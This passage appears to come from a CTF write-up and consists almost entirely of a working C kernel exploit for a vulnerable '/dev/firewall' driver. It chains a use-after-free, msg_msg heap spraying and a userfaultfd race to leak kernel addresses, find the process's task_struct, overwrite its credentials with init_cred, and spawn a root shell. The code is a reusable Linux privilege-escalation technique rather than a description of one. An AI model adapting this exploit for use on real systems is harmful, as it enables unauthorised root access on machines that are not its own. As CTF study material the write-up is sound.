    printf("[*] Release uffd 1\n");
    struct uffdio_copy uc;

    bzero(&uc, sizeof(struct uffdio_copy));
    // use uffdio_copy to write request's message
    uc.src = (unsigned long)msg_buf;
    uc.len = PAGE_SIZE;
    uc.dst = (unsigned long)0x1338000 & ~(PAGE_SIZE - 1);
    uc.mode = 0;
    uc.copy = 0;
    if (ioctl(u1, UFFDIO_COPY, &uc) == -1) {
      die("[!] Failed to uffdio_copy");
    }

    char *payload = calloc(1, 0x2000);
    *((uint64_t *)(payload + 0xfd0 - 8)) = init_cred;
    *((uint64_t *)(payload + 0xfd0)) = init_cred;
    *((uint64_t *)(payload + 0xfd0 + 8)) = init_cred;
    uffd_copy(uffd, payload, &uf_msg);
```

### EXP

```c
#include "./exploit.h"
#include <stdint.h>

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

#define DESC_MAX 0x800

typedef struct {
  char iface[16];
  char name[16];
  char ip[16];
  char netmask[16];
  uint8_t idx;
  uint8_t type;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
} user_rule_t;

typedef struct {
  char iface[16];
  char name[16];
  uint32_t ip;
  uint32_t netmask;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
  uint8_t is_duplicated;
} rule_t;

struct list_head {
  struct list_head *next, *prev;
};

struct msg_msg {
  struct list_head m_list;
  long m_type;
  size_t m_ts;    /* message text size */
  void *next;     /* struct msg_msgseg *next; */
  void *security; //无SELinux，这里为NULL
                  /* the actual message follows immediately */
};

typedef struct {
  long mtype;
  char mtext[1];
} msg;

int global_fd;
uint64_t kernbase, init_ipc_ns, init_task, init_cred;
uint64_t task_struct, dynamic_kobj_ktype, sysfs_bin_kfops_ro;
uint64_t next, prev;
void *target1, *target2;
int qid[4];
char msg_buf[0x2000];
uint64_t u1;
uint64_t relased = 0;

void ip_value_to_str(int ip, char *result, int size) {
  inet_ntop(AF_INET, (void *)&ip, result, size);
}

void add_rule(user_rule_t *rule) {
  int ret = 0;
  ret = ioctl(global_fd, ADD_RULE, rule);
  if (ret < 0) {
    die("[!] Failed to add rule");
  }
}

void dup_rule(user_rule_t *rule) {
  int ret = 0;
  ret = ioctl(global_fd, DUP_RULE, rule);
  if (ret < 0) {
    die("[!] Failed to dup rule");
  }
}

void del_rule(user_rule_t *rule) {
  int ret = 0;
  ret = ioctl(global_fd, DELETE_RULE, rule);
  if (ret < 0) {
    die("[!] Failed to del rule");
  }
}

void send_msg(int id, void *buf, size_t size, int flags) {
  if (msgsnd(id, buf, size, flags) < 0) {
    die("[!] Failed to send msg");
  }
  printf("[+] Send message: 0x%lx\n", size);
}

static void fault_handler_2(void *arg) {
  puts("[+] Enter userpagefault 2");

  static struct uffd_msg uf_msg;
  uint64_t uffd = (uint64_t)arg;
  struct pollfd pollfd;
  int nready;

  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  puts("[+] user2 polling...");
  while ((nready = poll(&pollfd, 1, -1)) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      die("[!] poll failed\n");
    }
    if ((read(uffd, &uf_msg, sizeof(uf_msg))) == 0) {
      die("[!] read uffd msg failed\n");
    }
    if (uf_msg.event != UFFD_EVENT_PAGEFAULT) {
      die("[!] unexpected pagefault\n");
    }

    printf("[+] user 2 page fault: %p\n", (void *)uf_msg.arg.pagefault.address);
    printf("[*] Release uffd 1\n");
    struct uffdio_copy uc;

    bzero(&uc, sizeof(struct uffdio_copy));
    // use uffdio_copy to write request's message
    uc.src = (unsigned long)msg_buf;
    uc.len = PAGE_SIZE;
    uc.dst = (unsigned long)0x1338000 & ~(PAGE_SIZE - 1);
    uc.mode = 0;
    uc.copy = 0;
    if (ioctl(u1, UFFDIO_COPY, &uc) == -1) {
      die("[!] Failed to uffdio_copy");
    }

    char *payload = calloc(1, 0x2000);
    *((uint64_t *)(payload + 0xfd0 - 8)) = init_cred;
    *((uint64_t *)(payload + 0xfd0)) = init_cred;
    *((uint64_t *)(payload + 0xfd0 + 8)) = init_cred;
    uffd_copy(uffd, payload, &uf_msg);

    break;
  }
  puts("[+] exit userpagefault 2 fault_handler!");
}

static void fault_handler_1(void *arg) {
  puts("[+] Enter userpagefault 1");

  static struct uffd_msg uf_msg;
  uint64_t uffd = (uint64_t)arg;
  struct pollfd pollfd;
  int nready;

  pollfd.fd = uffd;
  pollfd.events = POLLIN;
  u1 = uffd;

  puts("[+] polling...");
  while ((nready = poll(&pollfd, 1, -1)) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      die("[!] poll failed\n");
    }
    if ((read(uffd, &uf_msg, sizeof(uf_msg))) == 0) {
      die("[!] read uffd msg failed\n");
    }
    if (uf_msg.event != UFFD_EVENT_PAGEFAULT) {
      die("[!] unexpected pagefault\n");
    }

    printf("[+] page fault: %p\n", (void *)uf_msg.arg.pagefault.address);
    printf("[*] Modified msg0 next to msg2's segment\n");
    user_rule_t *rule = calloc(1, sizeof(user_rule_t));
    ((struct msg_msg *)rule)->m_list.next = (void *)prev;
    ((struct msg_msg *)rule)->m_list.prev = (void *)prev;
    ((struct msg_msg *)rule)->m_ts = 0x10;
    ((struct msg_msg *)rule)->m_type = 1;
    rule->idx = 0;
    rule->type = OUTBOUND;
    ip_value_to_str(next, rule->ip, 16);
    ip_value_to_str((next) >> 32, rule->netmask, 16);
    ioctl(global_fd, EDIT_RULE, rule);
    char buf[0x10];
    msgrcv(qid[0], buf, 0x10, 0, IPC_NOWAIT | MSG_NOERROR);

    printf("[*] Prepare fake msg struct\n");
    bzero(msg_buf, sizeof(msg_buf));
    ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))->next =
        (void *)(task_struct + 0x530);
    ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))->m_ts = 0xff8;
    ((struct msg_msg *)(msg_buf + 0xfd0 - 0x10))->m_type = 1;
    printf("[*] Now userfault 2\n");
    ((msg *)(target2 + PAGE_SIZE - 0x10))->mtype = 1;
    send_msg(qid[3], target2 + PAGE_SIZE - 0x10, 0xff8, 0);

    break;
  }
  puts("[+] exit userpagefault 1 fault_handler!");
  relased = 1;
}

int main() {
  user_rule_t *rule = calloc(1, sizeof(user_rule_t));
  msg *message = (msg *)msg_buf;
  int ret = 0;
  global_fd = open("/dev/firewall", O_RDWR);
  if (global_fd < 0) {
    die("[!] Failed to open /dev/firewall");
  }
  qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid[0] < 0) {
    die("[!] Failed to msgget");
  }
  qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid[1] < 0) {
    die("[!] Failed to msgget");
  }
  printf("[+] qid[0] = %d, qid[1] = %d\n", qid[0], qid[1]);

  printf("[*] UAF prepare...\n");
  rule->idx = 0;
  rule->type = INBOUND;
  strcpy(rule->netmask, "255.255.255.255");
  strcpy(rule->ip, "127.0.0.1");

  add_rule(rule);
  dup_rule(rule);
  del_rule(rule);

  bzero(msg_buf, 0x2000);
  message->mtype = 1;
  memset(message->mtext, 0x41, 0x10);
  send_msg(qid[0], message, 0x40 - 0x30, 0);
  memset(message->mtext, 0x42, 0x10);
  send_msg(qid[1], message, 0x40 - 0x30, 0);
  send_msg(qid[1], message, 0x1ff8 - 0x30, 0);

  ((struct msg_msg *)rule)->m_list.next = (void *)0xAAAAAAAA;
  ((struct msg_msg *)rule)->m_list.prev = (void *)0xBBBBBBBB;
  ((struct msg_msg *)rule)->m_ts = 0x2000;
  ((struct msg_msg *)rule)->m_type = 1;
  rule->idx = 0;
  rule->type = OUTBOUND;
  strcpy(rule->ip, "000000000");
  ioctl(global_fd, EDIT_RULE, rule);

  void *dump = calloc(1, 0x2000);
  printf("[+] dump:\t%p\n", dump);
  ret = msgrcv(qid[0], dump, 0x2000, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  if (ret < 0) {
    die("[!] Failed to recv message");
  }
  int i = 0;
  uint64_t val = 0;
  for (i = 0; i < 0x2000 / 8; i++) {
    val = ((uint64_t *)dump)[i];
    if ((val & 0xffffffff) == 0x42424242) {
      next = ((uint64_t *)dump)[i - 6];
      prev = ((uint64_t *)dump)[i - 5];
      // skip
      i++;
    }
    if ((val & 0xffff) == 0x1600) {
      dynamic_kobj_ktype = val;
    }
    if ((dynamic_kobj_ktype != 0) && (next != 0) && (prev != 0))
      break;
  }
  if (((int64_t)next >= 0) || ((int64_t)prev >= 0)) {
    printf("[!] Failed to get next and prev, try again\n");
    goto done;
  }
  kernbase = dynamic_kobj_ktype - 0xc41600;
  init_task = kernbase + 0xc124c0;
  init_cred = kernbase + 0xc33060;
  printf("[+] kernbase:\t0x%lx\n", kernbase);
  printf("[+] dynamic_kobj_ktype:\t0x%lx\n", dynamic_kobj_ktype);
  printf("[+] init_task:\t0x%lx\n", init_task);
  printf("[+] init_cred:\t0x%lx\n", init_cred);
  printf("[+} next:\t0x%lx\n", next);
  printf("[+] prev:\t0x%lx\n", prev);

  printf("[*] Task struct searching...\n");

  pid_t pid = getpid();
  printf("[+] self pid:\t%d\n", pid);
  uint64_t cur = init_task;
  ((struct msg_msg *)rule)->m_ts = 0xfd0 + 0x200;
  for (;;) {
    pid_t cur_id = 0;

    bzero(rule->ip, 16);
    ip_value_to_str(cur + 0x290, rule->ip, 16);
    ip_value_to_str((cur + 0x290) >> 32, rule->netmask, 16);
    ioctl(global_fd, EDIT_RULE, rule);
    bzero(dump, 0x1500);
    ret = msgrcv(qid[0], dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    if (ret < 0) {
      die("[!] Failed to recv message");
    }

    // read pid
    cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8));
    printf("[+] cur:\t0x%lx, pid:\t%d\n", cur, cur_id);
    if (cur_id == pid) {
      task_struct = cur;
      break;
    }
    // next
    cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298;
  }
  printf("[+] task_struct:\t0x%lx\n", task_struct);

  printf("[*] Kernel heap fengshui\n");
  printf("[*] Free qid#1 msg\n");
  ret = msgrcv(qid[1], dump, 0x40 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);
  if (ret < 0) {
    die("[!] Failed to recv message");
  }
  ret = msgrcv(qid[1], dump, 0x1ff8 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);
  if (ret < 0) {
    die("[!] Failed to recv message");
  }

  printf("[*] Create qid#2 msg & userfaultfd\n");
  target1 = mmap((void *)0x1337000, PAGE_SIZE * 3, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
  target2 = mmap((void *)0xdead000, PAGE_SIZE * 3, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
  RegisterUserfault(target1 + PAGE_SIZE, fault_handler_1);
  RegisterUserfault(target2 + PAGE_SIZE, fault_handler_2);

  qid[2] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid[2] < 0) {
    die("[!] Failed to msgget");
  }
  qid[3] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid[2] < 0) {
    die("[!] Failed to msgget");
  }
  ((msg *)(target1 + PAGE_SIZE - 0x10))->mtype = 1;
  send_msg(qid[2], target1 + PAGE_SIZE - 0x10, 0x1ff8 - 0x30, 0);

  while (!relased) {
  }
  pop_shell();
done:
  return 0;
}
```

![Untitled](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/2022-03-25-e07d3bcf413381f42704b85a6e2998f0.png)
